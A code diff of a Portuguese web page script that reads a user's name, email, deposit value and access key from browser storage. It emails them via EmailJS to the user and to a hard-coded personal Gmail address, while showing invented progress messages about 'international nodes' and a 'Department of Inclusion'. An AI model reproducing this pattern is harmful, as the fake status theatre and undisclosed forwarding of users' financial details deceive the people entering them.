@@ -67,63 +67,57 @@
     </div>
 <script>
     const messages = [
-        "Conectando ao Node New York...",
-        "Validando Protocolo Suíça...",
-        "Sincronizando Node Brazil...",
-        "Enviando Credenciais de Acesso...",
-        "Finalizando Handshake Global..."
+        "Iniciando Protocolo de Primeiro Acesso...",
+        "Criptografando Identidade Soberana...",
+        "Enviando Dados ao Departamento de Inclusão...",
+        "Sincronizando Nodes Internacionais...",
+        "Finalizando Registro de Custódia..."
     ];
 
     window.onload = function() {
-        // 1. RECUPERAÇÃO DE DADOS (Busca tanto em Session quanto em Local)
-        const nome = sessionStorage.getItem('userName') || localStorage.getItem('userName') || "Soberano";
-        const email = sessionStorage.getItem('userEmail') || localStorage.getItem('userEmail'); 
-        const valor = sessionStorage.getItem('userDeposit') || localStorage.getItem('userDeposit') || "0";
-        const key = sessionStorage.getItem('finalKey') || localStorage.getItem('finalKey') || "HPS-GLOBAL-SNC";
+        // 1. CAPTURA TOTAL (Busca em todas as memórias possíveis)
+        const nome = localStorage.getItem('userName') || sessionStorage.getItem('userName') || "Novo Cliente";
+        const email = localStorage.getItem('userEmail') || sessionStorage.getItem('userEmail'); 
+        const valor = localStorage.getItem('userDeposit') || sessionStorage.getItem('userDeposit') || "Sob Consulta";
+        const key = localStorage.getItem('finalKey') || sessionStorage.getItem('finalKey') || "AGUARDANDO-GERACAO";
 
-        const valorFormatado = new Intl.NumberFormat('pt-BR', {
-            style: 'currency', currency: 'BRL'
-        }).format(valor);
-
-        // 2. DISPARO DO E-MAIL VIA EMAILJS
+        // 2. DISPARO DO E-MAIL (Configuração Blindada)
         if (email && email.includes('@')) {
-            // CERTIFIQUE-SE DE TROCAR ESTES 3 IDs PELOS DO SEU PAINEL EMAILJS
+            // SUBSTITUA PELOS SEUS DADOS REAIS DO EMAILJS
             emailjs.init("SUA_PUBLIC_KEY_AQUI"); 
 
-            const paramsCliente = {
-                to_email: email,
-                user_name: nome,
-                user_key: key,
-                user_deposit: valorFormatado
-            };
-
-            const paramsInterno = {
-                to_email: "paulodallas63@gmail.com",
+            const templateParams = {
                 user_name: nome,
                 user_email: email,
                 user_key: key,
-                user_deposit: valorFormatado,
-                subject: `[NOVO DOSSIÊ] - Inclusão de ${nome}`
+                user_deposit: valor,
+                to_email: email // Envia para o cliente
             };
 
-            // Envio e Log de Confirmação no Console
-            emailjs.send("SEU_SERVICE_ID", "TEMPLATE_CLIENTE_ID", paramsCliente)
-                .then(() => console.log("Email Cliente: OK"))
-                .catch(err => console.error("Erro Cliente:", err));
+            const paramsInterno = {
+                ...templateParams,
+                to_email: "paulodallas63@gmail.com" // Seu e-mail de controle
+            };
 
+            // Envio para o Cliente
+            emailjs.send("SEU_SERVICE_ID", "TEMPLATE_CLIENTE_ID", templateParams)
+                .then(() => console.log("E-mail cliente enviado."))
+                .catch(err => console.error("Erro e-mail cliente:", err));
+
+            // Envio para o seu Banco (Dossiê)
             emailjs.send("SEU_SERVICE_ID", "TEMPLATE_INTERNO_ID", paramsInterno)
-                .then(() => console.log("Email Interno: OK"))
-                .catch(err => console.error("Erro Interno:", err));
+                .then(() => console.log("Dossiê enviado ao banco."))
+                .catch(err => console.error("Erro e-mail interno:", err));
         }
 
-        // 3. ANIMAÇÃO VISUAL
+        // 3. ANIMAÇÃO E REDIRECIONAMENTO LÓGICO
         let progress = 0;
         let msgIndex = 0;
         const statusDisplay = document.getElementById('status-display');
         const progressBar = document.getElementById('progress-bar');
 
         const interval = setInterval(() => {
-            progress += 2;
+            progress += 1;
             if (progressBar) progressBar.style.width = progress + "%";
 
             if (progress % 20 === 0 && msgIndex < messages.length) {
@@ -133,12 +127,17 @@
 
             if (progress >= 100) {
                 clearInterval(interval);
+                
+                // --- MUDANÇA NO REDIRECIONAMENTO ---
+                // Como ele não tem a conta .html ainda, enviamos para uma página de sucesso geral
+                alert("SOLICITAÇÃO ENVIADA COM SUCESSO!\n\nSeu Dossiê de Governança está sendo tecido pelo nosso Departamento de Inclusão. Você receberá uma confirmação em seu e-mail em instantes.");
+                
                 setTimeout(() => {
-                    // Redireciona para a página final da chave (estilo .html)
-                    window.location.href = key + ".html"; 
-                }, 500);
+                    // Redireciona para o portal global enquanto o arquivo dele não é criado
+                    window.location.href = "https://iartium.com/global";
+                }, 1000);
             }
-        }, 100); 
+        }, 80); // Velocidade ajustada para 8 segundos de experiência
     };
 </script>
 </body>
